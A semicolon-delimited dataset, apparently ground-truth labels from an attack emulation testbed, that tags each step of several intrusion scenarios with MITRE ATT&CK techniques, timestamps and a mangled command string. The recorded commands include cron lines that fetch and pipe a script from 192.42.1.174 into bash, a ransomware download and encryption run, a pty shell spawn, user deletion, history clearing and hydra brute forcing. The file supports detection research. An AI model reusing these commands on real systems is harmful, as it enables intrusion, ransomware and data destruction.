scenario;tactics;techniques;technique_names;event_id;cmd;start;end
3_vnc_apt;defense-evasiondefense-evasion;T1036.005_T1564.001;NA;50;key;1765563636.401406;1765563642.0
3_vnc_apt;persistence_privilege-escalation_defense-evasion;T1574;NA;51;key;1765563696.439139;1765563702.0
3_vnc_apt;executionpersistence_privilege-escalation_defense-evasion;T1059_T1574;NA;52;sed__i__s_1__0_1_1__0_2_g__DEBIAN_control_;1765563741.455037;1765563747.0
3_vnc_apt;execution_persistence_privilege-escalationcommand-and-controlcommand-and-control;T1053.003_T1105_T1071.001;NA;53;sed__i___invoke_rc_a_echo____5_________root__usr_bin_curl_http___192_42_1_174_8888_install_sh____bin_bash_____etc_cron_d_health__DEBIAN_postinst_;1765563771.471376;1765563777.0
3_vnc_apt;execution_lateral-movement;T1072;NA;54;key;1765563846.524044;1765563852.0
3_vnc_apt;execution_lateral-movement;T1072;NA;54;key;1765563906.553629;1765564092.0
3_vnc_apt;execution;T1059;NA;19;shell;1765564238.138155;1765564245.0
3_vnc_apt;execution;T1059;NA;20;python3__c__import_pty_pty_spawn___bash_____;1765564254.497476;1765564261.0
3_vnc_apt;execution;T1059;NA;21;export_SHELL_bash;1765564270.774186;1765564277.0
3_vnc_apt;execution;T1059;NA;22;export_TERM_xterm256_color;1765564286.997685;1765564294.0
3_vnc_apt;execution;T1059;NA;23;stty_rows_38_columns_116;1765564303.308279;1765564310.0
3_vnc_apt;execution;T1059;NA;24;export_PS1__PWN__;1765564319.643304;1765564326.0
3_vnc_apt;impactcommand-and-control;T1486_T1105;NA;25;curl_http___192_42_1_174_donotcry___donotcry;1765564335.86239;1765564343.0
3_vnc_apt;impactimpact;T1486_T1565.001;NA;26;_lib64_ld_linux_x86_64_so_2_donotcry_encrypt__media_data_Images;1765564352.123251;1765564362.0
3_vnc_apt;discovery;T1018;NA;27;find__media_data_Images;1765564368.485283;1765564375.0
3_vnc_apt;discovery;T1087.001;NA;28;cat__etc_passwd;1765564384.703938;1765564392.0
3_vnc_apt;impact;T1531;NA;29;userdel__f_john;1765564401.034618;1765564408.0
3_vnc_apt;impact;T1485;NA;30;rm;1765564417.413314;1765564424.0
3_vnc_apt;impact;T1490;NA;31;rm;1765564433.707637;1765564441.0
3_vnc_apt;impact;T1489;NA;32;systemctl_stop_exim4_service;1765564450.087127;1765564487.0
3_vnc_healthcheck;credential-accesslateral-movement;T1110.001_T1021.005;NA;55;items_LISTA_;1765548811.111336;1765549357.0
3_vnc_healthcheck;lateral-movement;T1021.005;NA;42;click;1765549366.429517;1765549375.0
3_vnc_healthcheck;lateral-movement;T1021.005;NA;43;terminal;1765549384.439424;1765549396.0
3_vnc_healthcheck;lateral-movement;T1021.005;NA;44;sudo__i;1765549420.453466;1765549439.0
3_vnc_healthcheck;credential-access;T1003.008;NA;45;key;1765549508.487801;1765549519.0
3_vnc_healthcheck;collection;T1213;NA;46;key;1765549543.503669;1765549554.0
3_vnc_healthcheck;collection;T1039;NA;47;key;1765549578.523648;1765549586.0
3_vnc_healthcheck;command-and-controlexecutionexecution_persistence_privilege-escalationlateral-movementcommand-and-control;T1105_T1059.004_T1053.003_T1021.005_T1071.001;NA;56;echo__curl_http___192_42_1_174_8888_install_sh___bash______media_share_healthcheck_cron_sh;1765549595.528145;1765549604.0
3_vnc_healthcheck;lateral-movement;T1021.005;NA;57;close;1765549628.543519;1765549634.0
3_vnc_healthcheck;discovery;T1082;NA;35;sysinfo;1765549643.733173;1765549813.0
3_vnc_healthcheck;discovery;T1033;NA;36;getuid;1765549822.226739;1765549829.0
3_vnc_healthcheck;execution;T1059;NA;19;shell;1765549869.808575;1765549877.0
3_vnc_healthcheck;execution;T1059;NA;20;python3__c__import_pty_pty_spawn___bash_____;1765549886.025269;1765549893.0
3_vnc_healthcheck;execution;T1059;NA;21;export_SHELL_bash;1765549902.395576;1765549909.0
3_vnc_healthcheck;execution;T1059;NA;22;export_TERM_xterm256_color;1765549918.762878;1765549926.0
3_vnc_healthcheck;execution;T1059;NA;23;stty_rows_38_columns_116;1765549935.130208;1765549942.0
3_vnc_healthcheck;execution;T1059;NA;24;export_PS1__PWN__;1765549951.411086;1765549958.0
3_vnc_healthcheck;impactcommand-and-control;T1486_T1105;NA;25;curl_http___192_42_1_174_donotcry___donotcry;1765549967.735217;1765549975.0
3_vnc_healthcheck;impactimpact;T1486_T1565.001;NA;26;_lib64_ld_linux_x86_64_so_2_donotcry_encrypt__media_data_Images;1765549984.061835;1765549994.0
3_vnc_healthcheck;discovery;T1018;NA;27;find__media_data_Images;1765550000.430899;1765550007.0
3_vnc_healthcheck;discovery;T1087.001;NA;28;cat__etc_passwd;1765550016.81146;1765550024.0
3_vnc_healthcheck;impact;T1531;NA;29;userdel__f_john;1765550033.091623;1765550040.0
3_vnc_healthcheck;impact;T1485;NA;30;rm;1765550049.453031;1765550056.0
3_vnc_healthcheck;impact;T1490;NA;31;rm;1765550065.829331;1765550073.0
3_vnc_healthcheck;impact;T1489;NA;32;systemctl_stop_exim4_service;1765550082.16646;1765550119.0
3_vnc_puppet;credential-accesslateral-movement;T1110.001_T1021.005;NA;58;items_LISTA_;1765740780.027561;1765741326.0
3_vnc_puppet;lateral-movement;T1021.005;NA;42;click;1765741335.320118;1765741344.0
3_vnc_puppet;lateral-movement;T1021.005;NA;43;terminal;1765741353.324804;1765741365.0
3_vnc_puppet;defense-evasion_persistence_privilege-escalation_initial-access;T1078.003;NA;59;sudo__i;1765741389.338609;1765741398.0
3_vnc_puppet;defense-evasion_persistence_privilege-escalation_initial-access;T1078.003;NA;59;sudo__i;1765741422.354904;1765741441.0
3_vnc_puppet;credential-access;T1003.008;NA;45;key;1765741510.397461;1765741521.0
3_vnc_puppet;collection;T1213;NA;46;key;1765741545.422639;1765741556.0
3_vnc_puppet;collection;T1039;NA;47;key;1765741580.447995;1765741594.0
3_vnc_puppet;execution_lateral-movementcommand-and-controlexecution;T1072_T1105_T1059.004;NA;60;key;1765741648.524237;1765741729.0
3_vnc_puppet;execution;T1059;NA;19;shell;1765741746.255616;1765741753.0
3_vnc_puppet;execution;T1059;NA;20;python3__c__import_pty_pty_spawn___bash_____;1765741762.521674;1765741769.0
3_vnc_puppet;execution;T1059;NA;21;export_SHELL_bash;1765741778.888133;1765741786.0
3_vnc_puppet;execution;T1059;NA;22;export_TERM_xterm256_color;1765741795.243498;1765741802.0
3_vnc_puppet;execution;T1059;NA;23;stty_rows_38_columns_116;1765741811.528912;1765741818.0
3_vnc_puppet;execution;T1059;NA;24;export_PS1__PWN__;1765741827.850745;1765741835.0
3_vnc_puppet;impactcommand-and-control;T1486_T1105;NA;25;curl_http___192_42_1_174_donotcry___donotcry;1765741844.226411;1765741851.0
3_vnc_puppet;impactimpact;T1486_T1565.001;NA;26;_lib64_ld_linux_x86_64_so_2_donotcry_encrypt__media_data_Images;1765741860.596682;1765741870.0
3_vnc_puppet;discovery;T1018;NA;27;find__media_data_Images;1765741876.912521;1765741884.0
3_vnc_puppet;discovery;T1087.001;NA;28;cat__etc_passwd;1765741893.308017;1765741900.0
3_vnc_puppet;impact;T1531;NA;29;userdel__f_john;1765741909.597456;1765741916.0
3_vnc_puppet;impact;T1485;NA;30;rm;1765741925.894437;1765741933.0
3_vnc_puppet;impact;T1490;NA;31;rm;1765741942.18166;1765741949.0
3_vnc_puppet;impact;T1489;NA;32;systemctl_stop_exim4_service;1765741958.510388;1765741995.0
4;command-and-control;T1071.001;NA;1;generate_implant;1765796569.184731;1765796588.0
4;command-and-control;T1071.001;NA;2;start_https_listener;1765796597.973346;1765796604.0
4;defense-evasion_persistence_privilege-escalation_initial-accesscommand-and-controldefense-evasion_persistence_command-and-control;T1078.003_T1105_T1205.001;NA;3;sshpass__p__rambo__scp__o_StrictHostKeyChecking_no__o_ProxyCommand__sshpass__p__rambo__ssh__o_StrictHostKeyChecking_no__p_10022_john_fw_attackbed_com_nc_firewall_attackbed_local_22___home_aecid_auditf_tar_gz_john_firewall_attackbed_local__tmp_auditf_tar_gz;1765796613.743321;1765796634.0
4;defense-evasion_persistence_privilege-escalation_initial-access;T1078.003;NA;4;id;1765796643.173316;1765796660.0
4;defense-evasion_persistence_privilege-escalation_initial-access;T1078.003;NA;5;ssh__o_StrictHostKeyChecking_no__o_PreferredAuthentications_password_john_firewall_attackbed_local_;1765796669.397715;1765796685.0
4;defense-evasion_persistence_privilege-escalation_initial-access;T1078.003;NA;6;rambo_;1765796694.503413;1765796702.0
4;privilege-escalation_defense-evasion;T1548.003;NA;7;_i_;1765796711.363792;1765796734.0
4;privilege-escalation_defense-evasion;T1548.003;NA;8;rambo_;1765796743.370515;1765796750.0
4;defense-evasiondefense-evasion_persistence_command-and-control;T1036.005_T1205.001;NA;9;tar__xzf__tmp_auditf_tar_gz__C__usr_bin_;1765796759.102844;1765796765.0
4;defense-evasion;T1070.004;NA;10;rm;1765796774.201647;1765796783.0
4;persistence_privilege-escalation;T1543.002;NA;11;_Unit__Description_Run_auditf_on_boot___Service__ExecStart_auditf_WorkingDirectory__usr_bin_Restart_on_failure_Type_simple___Install__WantedBy_multi_user_target_;1765796927.353032;1765796948.0
4;persistence_privilege-escalation;T1543.002;NA;12;_wq__;1765796987.364409;1765796995.0
4;persistence_privilege-escalation;T1543.002;NA;13;systemctl_daemon_reload_;1765797004.402143;1765797015.0
4;persistence_privilege-escalation;T1543.002;NA;14;systemctl_enable_auditf_service_;1765797024.860971;1765797034.0
4;persistence_privilege-escalation;T1543.002;NA;15;systemctl_start_auditf_service_;1765797043.267958;1765797059.0
4;defense-evasion_persistence_command-and-controlcommand-and-controldefense-evasion;T1205.001_T1071.001_T1036.005;NA;16;_home_aecid_knock_cli__c_knock_yaml__r_knock_firewall;1765797103.398182;1765797114.0
4;defense-evasion;T1599;NA;17;execute;1765797123.443731;1765797129.0
4;defense-evasion;T1599;NA;18;execute;1765797138.534163;1765797145.0
4;defense-evasion_persistence_privilege-escalation_initial-access;T1078.003;NA;19;id;1765797154.587276;1765797162.0
4;defense-evasion_persistence_privilege-escalation_initial-access;T1078.003;NA;20;ssh__o_StrictHostKeyChecking_no__o_PreferredAuthentications_password_john_linuxshare_attackbed_local_;1765797171.153277;1765797182.0
4;defense-evasion_persistence_privilege-escalation_initial-access;T1078.003;NA;21;rambo_;1765797191.241217;1765797199.0
4;discovery;T1082;NA;22;hostname_;1765797208.297004;1765797244.0
5;credential-access_discoverycredential-access_collection;T1040_T1557.002;NA;1;bettercap__caplet__home_aecid_bettercap_cap;1760008116.165282;1760008122.0
5;credential-access_discoverycredential-access;T1040_T1528;NA;2;_usr_local_share_attackmate_venvpython3__home_aecid_get_auth_py;1760008136.165282;1760008210.0
5;defense-evasion_lateral-movement;T1550.001;NA;3;GET;1760008234.553295;1760008240.0
6_macro_binary;command-and-controlexecution;T1105_T1204.002;NA;1;key;1765277478.87141;1765277490.0
6_macro_binary;execution;T1204.002;NA;2;key;1765277514.897282;1765277533.0
6_macro_binary;discovery;T1082;NA;3;sysinfo;1765277533.089892;1765277545.0
6_macro_binary;command-and-control;T1105;NA;4;upload_downloader_sh;1765277554.661725;1765277562.0
6_macro_binary;execution;T1059.004;NA;5;shell;1765277586.054663;1765277593.0
6_macro_binary;execution;T1059.004;NA;6;python3__c__import_pty_pty_spawn___bash_____;1765277602.41324;1765277609.0
6_macro_binary;execution;T1059.004;NA;7;export_SHELL_bash;1765277618.773499;1765277626.0
6_macro_binary;execution;T1059.004;NA;8;export_TERM_xterm256_color;1765277635.149335;1765277642.0
6_macro_binary;execution;T1059.004;NA;9;stty_rows_38_columns_116;1765277651.515965;1765277658.0
6_macro_binary;execution;T1059.004;NA;10;export_DISPLAY__0;1765277667.883572;1765277675.0
6_macro_binary;command-and-control;T1105;NA;11;curl__o__home_judy__local_share_firefox_firefox_startup_dailynews_wire_com_8083_index;1765277684.220261;1765277691.0
6_macro_binary;persistence_privilege-escalation_defense-evasionprivilege-escalation_persistence;T1574.008_T1546;NA;12;ln__sf__home_judy__local_share_firefox_firefox_startup__home_judy__localfirefox;1765277700.586054;1765277707.0
6_macro_binary;defense-evasion;T1222.002;NA;13;chmod__x__home_judy__local_share_firefox_firefox_startup;1765277716.916823;1765277724.0
6_macro_binary;command-and-control;T1105;NA;14;curl__o__home_judy__localtask_runner_dailynews_wire_com_8082_index;1765277733.273726;1765277740.0
6_macro_binary;collection;T1115;NA;15;xclip__selection_clipboard__o;1765277749.514484;1765277756.0
6_macro_binary;defense-evasion;T1564.001;NA;16;cp__tmp_index__home_judy__index;1765277765.881365;1765277773.0
6_macro_binary;defense-evasion;T1222.002;NA;17;chmod__x__home_judy__localtask_runner;1765277782.122814;1765277789.0
6_macro_binary;defense-evasion;T1222.002;NA;18;chmod__x__home_judy_downloader_sh;1765277798.485548;1765277805.0
6_macro_binary;discovery;T1010;NA;19;wmctrl__l;1765277814.850158;1765277822.0
6_macro_binary;execution_persistence_privilege-escalation;T1053.003;NA;20;crontab__e;1765277831.168499;1765277838.0
6_macro_binary;execution_persistence_privilege-escalation;T1053.003;NA;21;__10__________home_judy_downloader_sh;1765277880.182365;1765277927.0
6_macro_binary;execution_persistence_privilege-escalation;T1053.003;NA;22;_wq__;1765277952.824707;1765278010.0
6_macro_binary;defense-evasion;T1070.003;NA;23;history__c;1765277929.179431;1765277951.0
6_macro_cron;command-and-controlexecution;T1105_T1204.002;NA;1;key;1765360740.134735;1765360753.0
6_macro_cron;execution;T1204.002;NA;2;key;1765360777.1596;1765360823.0
6_macro_cron;discovery;T1082;NA;3;sysinfo;1765360822.357011;1765360834.0
6_macro_cron;command-and-control;T1105;NA;4;upload_downloader_sh;1765360843.893111;1765360851.0
6_macro_cron;execution;T1059.004;NA;5;shell;1765360875.272236;1765360882.0
6_macro_cron;execution;T1059.004;NA;6;python3__c__import_pty_pty_spawn___bash_____;1765360891.63207;1765360898.0
6_macro_cron;execution;T1059.004;NA;7;export_SHELL_bash;1765360907.994595;1765360915.0
6_macro_cron;execution;T1059.004;NA;8;export_TERM_xterm256_color;1765360924.353349;1765360931.0
6_macro_cron;execution;T1059.004;NA;9;stty_rows_38_columns_116;1765360940.710076;1765360948.0
6_macro_cron;execution;T1059.004;NA;10;export_DISPLAY__0;1765360957.028943;1765360964.0
6_macro_cron;command-and-control;T1105;NA;14;curl__o__home_judy__localtask_runner_dailynews_wire_com_8082_index;1765360973.38978;1765360980.0
6_macro_cron;collection;T1115;NA;15;xclip__selection_clipboard__o;1765360989.720096;1765360997.0
6_macro_cron;defense-evasion;T1564.001;NA;16;cp__tmp_index__home_judy__index;1765361006.083338;1765361013.0
6_macro_cron;defense-evasion;T1222.002;NA;17;chmod__x__home_judy__localtask_runner;1765361022.373697;1765361029.0
6_macro_cron;defense-evasion;T1222.002;NA;18;chmod__x__home_judy_downloader_sh;1765361038.645813;1765361045.0
6_macro_cron;discovery;T1010;NA;19;wmctrl__l;1765361054.893245;1765361062.0
6_macro_cron;execution_persistence_privilege-escalation;T1053.003;NA;20;crontab__e;1765361071.216133;1765361078.0
6_macro_cron;execution_persistence_privilege-escalation;T1053.003;NA;21;__10__________home_judy_downloader_sh;1765361120.321794;1765361167.0
6_macro_cron;execution_persistence_privilege-escalation;T1053.003;NA;24;__5_________bash__c__home_judy__index;1765361169.318112;1765361211.0
6_macro_cron;execution_persistence_privilege-escalation;T1053.003;NA;22;_wq__;1765361242.048328;1765361839.0
6_macro_cron;defense-evasion;T1070.003;NA;23;history__c;1765361218.365582;1765361240.0
6_plugin;persistencecollection_credential-accesscollection_credential-accesscollection;T1176_T1056.001_T1056.004_T1115;NA;25;wget__O___home_judy_extension_xpi_dailynews_wire_com_8082_index;1765444814.665152;1765444823.0
6_plugin;persistencecollection_credential-accesscollection_credential-accesscollection;T1176_T1056.001_T1056.004_T1115;NA;26;key;1765444832.6839;1765444867.0
6_plugin;persistencecollection_credential-accesscollection_credential-accesscollection;T1176_T1056.001_T1056.004_T1115;NA;27;xdg_settings_set_default_web_browser_firefox_desktop____firefox_extension_xpi;1765444867.692111;1765444876.0
6_plugin;persistencecollection_credential-accesscollection_credential-accesscollection;T1176_T1056.001_T1056.004_T1115;NA;26;key;1765444885.712438;1765444960.0
6_plugin;persistencecollection_credential-accesscollection_credential-accesscollection;T1176_T1056.001_T1056.004_T1115;NA;28;move;1765444960.723121;1765444973.0
6_plugin;persistencecollection_credential-accesscollection_credential-accesscollection;T1176_T1056.001_T1056.004_T1115;NA;29;click;1765444977.730055;1765444985.0
6_plugin;persistencecollection_credential-accesscollection_credential-accesscollection;T1176_T1056.001_T1056.004_T1115;NA;30;move;1765444994.735945;1765445010.0
6_plugin;persistencecollection_credential-accesscollection_credential-accesscollection;T1176_T1056.001_T1056.004_T1115;NA;29;click;1765445011.741212;1765445024.0
6_plugin;collection_credential-access;T1056.001;NA;31;172_17_10;1765445063.757327;1765445075.0
6_plugin;collection_credential-access;T1056.001;NA;32;0_121_80_zm;1765445079.764204;1765445131.0
6_plugin;collection_credential-accesscollection_credential-access;T1056.004_T1056.001;NA;33;StarryEcho42BlazeTrix;1765445131.777439;1765445159.0
6_plugin;collection_credential-accesscollection_credential-access;T1056.004_T1056.001;NA;34;TwilightV3n0mR3alm9QzX;1765445163.790492;1765445192.0
6_plugin;collection_credential-access;T1056.004;NA;35;key;1765445196.80223;1765445247.0
6_plugin;collection;T1115;NA;36;move;1765445251.815577;1765445261.0
6_plugin;collection;T1115;NA;37;click;1765445268.821025;1765445304.0
6_screensharing_binary;executioncommand-and-controlinitial-access;T1204.001_T1105_T1566.004;NA;38;sudo_wget__O_rustdesk_deb__e_use_proxy_yes__e_https_proxy_https___192_168_50_254_3128_https___github_com_rustdesk_rustdesk_releases_download_1_3_8_rustdesk_1_3_8_x86_64_deb;1765379228.140453;1765379236.0
6_screensharing_binary;executioncommand-and-controlinitial-access;T1204.001_T1105_T1566.004;NA;39;key;1765379245.174466;1765379431.0
6_screensharing_binary;executioncommand-and-control;T1204.001_T1219;NA;40;sudo_apt_install__fy___rustdesk_deb;1765379440.189145;1765379449.0
6_screensharing_binary;executioncommand-and-control;T1204.001_T1219;NA;41;key;1765379458.208684;1765379644.0
6_screensharing_binary;initial-accesscommand-and-control;T1566.004_T1219;NA;42;sudo_rustdesk___password_password;1765379653.220461;1765379661.0
6_screensharing_binary;initial-accesscommand-and-control;T1566.004_T1219;NA;43;key;1765379670.228394;1765379686.0
6_screensharing_binary;initial-accesscommand-and-control;T1566.004_T1219;NA;44;rustdesk;1765379695.236242;1765379703.0
6_screensharing_binary;initial-accesscommand-and-control;T1566.004_T1219;NA;43;key;1765379712.243273;1765379736.0
6_screensharing_binary;command-and-control;T1219;NA;45;192_42_1_174;1765379745.301333;1765379902.0
6_screensharing_binary;command-and-control;T1219;NA;46;click;1765379926.317761;1765380061.0
6_screensharing_binary;command-and-control;T1219;NA;47;move;1765380521.750168;1765380590.0
6_screensharing_binary;command-and-control;T1219;NA;46;click;1765380599.760228;1765380626.0
6_screensharing_binary;command-and-controlcommand-and-controldefense-evasion;T1105_T1219_T1564.001;NA;48;curl__o__home_judy__index_facebock_com_8080_index;1765380695.830098;1765380721.0
6_screensharing_binary;command-and-controlcommand-and-controldefense-evasion;T1105_T1219_T1564.001;NA;49;key;1765380730.840364;1765380746.0
6_screensharing_binary;defense-evasioncommand-and-control;T1222.002_T1219;NA;50;sudo_chmod__x__home_judy__index;1765380755.848726;1765380781.0
6_screensharing_binary;defense-evasioncommand-and-control;T1222.002_T1219;NA;51;key;1765380790.859935;1765380797.0
6_screensharing_binary;command-and-controlcommand-and-control;T1105_T1219;NA;52;curl__o__home_judy__local_share_firefox_firefox_startup_192_42_1_174_8083_index;1765380806.867252;1765380822.0
6_screensharing_binary;command-and-controlcommand-and-control;T1105_T1219;NA;53;key;1765380831.885372;1765380847.0
6_screensharing_binary;defense-evasioncommand-and-control;T1222.002_T1219;NA;54;chmod__x__home_judy__local_share_firefox_firefox_startup;1765380856.894112;1765380872.0
6_screensharing_binary;defense-evasioncommand-and-control;T1222.002_T1219;NA;51;key;1765380881.912713;1765380890.0
6_screensharing_binary;persistence_privilege-escalation_defense-evasioncommand-and-control;T1574.008_T1219;NA;55;ln__sf__home_judy__local_share_firefox_firefox_startup__home;1765380899.917902;1765380906.0
6_screensharing_binary;persistence_privilege-escalation_defense-evasioncommand-and-control;T1574.008_T1219;NA;56;_judy__local_bin_firefox;1765380915.936799;1765380922.0
6_screensharing_binary;persistence_privilege-escalation_defense-evasioncommand-and-control;T1574.008_T1219;NA;57;key;1765380931.947863;1765380940.0
6_screensharing_binary;executioncommand-and-control;T1059.004_T1219;NA;58;firefox;1765380949.955382;1765380956.0
6_screensharing_binary;executioncommand-and-control;T1059.004_T1219;NA;59;key;1765380965.965194;1765380974.0
6_screensharing_binary;discovery;T1082;NA;3;sysinfo;1765380984.118788;1765380996.0
6_screensharing_binary;command-and-control;T1105;NA;4;upload_downloader_sh;1765381005.619986;1765381012.0
6_screensharing_binary;execution;T1059.004;NA;5;shell;1765381036.974084;1765381044.0
6_screensharing_binary;execution;T1059.004;NA;6;python3__c__import_pty_pty_spawn___bash_____;1765381053.285864;1765381060.0
6_screensharing_binary;execution;T1059.004;NA;7;export_SHELL_bash;1765381069.560938;1765381076.0
6_screensharing_binary;execution;T1059.004;NA;8;export_TERM_xterm256_color;1765381085.78076;1765381093.0
6_screensharing_binary;execution;T1059.004;NA;9;stty_rows_38_columns_116;1765381102.152988;1765381109.0
6_screensharing_binary;execution;T1059.004;NA;10;export_DISPLAY__0;1765381118.520526;1765381125.0
6_screensharing_binary;command-and-control;T1105;NA;14;curl__o__home_judy__localtask_runner_dailynews_wire_com_8082_index;1765381134.838633;1765381142.0
6_screensharing_binary;collection;T1115;NA;15;xclip__selection_clipboard__o;1765381151.14884;1765381158.0
6_screensharing_binary;defense-evasion;T1222.002;NA;17;chmod__x__home_judy__localtask_runner;1765381167.498607;1765381174.0
6_screensharing_binary;defense-evasion;T1222.002;NA;18;chmod__x__home_judy_downloader_sh;1765381183.781693;1765381191.0
6_screensharing_binary;discovery;T1010;NA;19;wmctrl__l;1765381200.112451;1765381207.0
6_screensharing_binary;execution_persistence_privilege-escalation;T1053.003;NA;20;crontab__e;1765381216.438095;1765381223.0
6_screensharing_binary;execution_persistence_privilege-escalation;T1053.003;NA;21;__10__________home_judy_downloader_sh;1765381265.450781;1765381312.0
6_screensharing_binary;execution_persistence_privilege-escalation;T1053.003;NA;22;_wq__;1765381338.135561;1765381935.0
6_screensharing_binary;defense-evasion;T1070.003;NA;23;history__c;1765381314.512496;1765381336.0
6_screensharing_cron;executioncommand-and-controlinitial-access;T1204.001_T1105_T1566.004;NA;38;sudo_wget__O_rustdesk_deb__e_use_proxy_yes__e_https_proxy_https___192_168_50_254_3128_https___github_com_rustdesk_rustdesk_releases_download_1_3_8_rustdesk_1_3_8_x86_64_deb;1765385741.814665;1765385749.0
6_screensharing_cron;executioncommand-and-controlinitial-access;T1204.001_T1105_T1566.004;NA;39;key;1765385758.838868;1765386064.0
6_screensharing_cron;executioncommand-and-control;T1204.001_T1219;NA;40;sudo_apt_install__fy___rustdesk_deb;1765386073.84587;1765386082.0
6_screensharing_cron;executioncommand-and-control;T1204.001_T1219;NA;41;key;1765386091.861395;1765386397.0
6_screensharing_cron;initial-accesscommand-and-control;T1566.004_T1219;NA;42;sudo_rustdesk___password_password;1765386406.870909;1765386414.0
6_screensharing_cron;initial-accesscommand-and-control;T1566.004_T1219;NA;43;key;1765386423.889044;1765386439.0
6_screensharing_cron;initial-accesscommand-and-control;T1566.004_T1219;NA;44;rustdesk;1765386448.895256;1765386456.0
6_screensharing_cron;initial-accesscommand-and-control;T1566.004_T1219;NA;43;key;1765386465.902119;1765386489.0
6_screensharing_cron;command-and-control;T1219;NA;45;192_42_1_174;1765386498.978291;1765386655.0
6_screensharing_cron;command-and-control;T1219;NA;46;click;1765386679.990134;1765386814.0
6_screensharing_cron;command-and-control;T1219;NA;47;move;1765387275.221452;1765387344.0
6_screensharing_cron;command-and-control;T1219;NA;46;click;1765387353.230942;1765387380.0
6_screensharing_cron;command-and-controlcommand-and-controldefense-evasion;T1105_T1219_T1564.001;NA;48;curl__o__home_judy__index_facebock_com_8080_index;1765387449.261085;1765387475.0
6_screensharing_cron;command-and-controlcommand-and-controldefense-evasion;T1105_T1219_T1564.001;NA;49;key;1765387484.276726;1765387500.0
6_screensharing_cron;defense-evasioncommand-and-control;T1222.002_T1219;NA;50;sudo_chmod__x__home_judy__index;1765387509.284687;1765387535.0
6_screensharing_cron;defense-evasioncommand-and-control;T1222.002_T1219;NA;51;key;1765387544.301645;1765387551.0
6_screensharing_cron;command-and-controlexecution;T1219_T1059.004;NA;60;_home_judy__index__;1765387560.310526;1765387586.0
6_screensharing_cron;command-and-controlexecution;T1219_T1059.004;NA;59;key;1765387595.323764;1765387606.0
6_screensharing_cron;discovery;T1082;NA;3;sysinfo;1765387615.443862;1765387627.0
6_screensharing_cron;command-and-control;T1105;NA;4;upload_downloader_sh;1765387636.955659;1765387644.0
6_screensharing_cron;execution;T1059.004;NA;5;shell;1765387668.295655;1765387675.0
6_screensharing_cron;execution;T1059.004;NA;6;python3__c__import_pty_pty_spawn___bash_____;1765387684.512602;1765387691.0
6_screensharing_cron;execution;T1059.004;NA;7;export_SHELL_bash;1765387700.88676;1765387708.0
6_screensharing_cron;execution;T1059.004;NA;8;export_TERM_xterm256_color;1765387717.259517;1765387724.0
6_screensharing_cron;execution;T1059.004;NA;9;stty_rows_38_columns_116;1765387733.626763;1765387740.0
6_screensharing_cron;execution;T1059.004;NA;10;export_DISPLAY__0;1765387749.960071;1765387757.0
6_screensharing_cron;command-and-control;T1105;NA;14;curl__o__home_judy__localtask_runner_dailynews_wire_com_8082_index;1765387766.331259;1765387773.0
6_screensharing_cron;collection;T1115;NA;15;xclip__selection_clipboard__o;1765387782.698147;1765387790.0
6_screensharing_cron;defense-evasion;T1222.002;NA;17;chmod__x__home_judy__localtask_runner;1765387799.009554;1765387806.0
6_screensharing_cron;defense-evasion;T1222.002;NA;18;chmod__x__home_judy_downloader_sh;1765387815.374873;1765387822.0
6_screensharing_cron;discovery;T1010;NA;19;wmctrl__l;1765387831.740932;1765387838.0
6_screensharing_cron;execution_persistence_privilege-escalation;T1053.003;NA;20;crontab__e;1765387848.00036;1765387855.0
6_screensharing_cron;execution_persistence_privilege-escalation;T1053.003;NA;21;__10__________home_judy_downloader_sh;1765387896.997087;1765387944.0
6_screensharing_cron;execution_persistence_privilege-escalation;T1053.003;NA;24;__5_________bash__c__home_judy__index;1765387945.872527;1765387988.0
6_screensharing_cron;execution_persistence_privilege-escalation;T1053.003;NA;22;_wq__;1765388018.478988;1765388615.0
6_screensharing_cron;defense-evasion;T1070.003;NA;23;history__c;1765387994.851946;1765388017.0
7;reconnaissancereconnaissance;T1590.002_T1591;NA;1;dnsenum__f__usr_local_share_SecLists_Discovery_DNS_subdomains_top1million_5000_txt___dnsserver_192_42_0_233_attackbed_com;1768990206.72578;1768990216.0
7;reconnaissance;T1589.002;NA;2;__smtp_user_enum_pl___M_VRFY__U_smtp_user_txt__t_mail_attackbed_com;1768990225.391788;1768990261.0
7;defense-evasion_persistence_privilege-escalation_initial-accesscredential-accesspersistence_initial-access;T1078.002_T1110.001_T1133;NA;3;hydra__l__alice_attackbed_com___P_smtp_pass_txt__c_5__s_143_mail_attackbed_com_imap;1768990270.641499;1768991500.0
7;reconnaissance;T1592.002;NA;4;GET;1768991509.034047;1768991515.0
7;command-and-controlcommand-and-control;T1071.001_T1573.001;NA;5;start_https_listener;1768991553.638031;1768991559.0
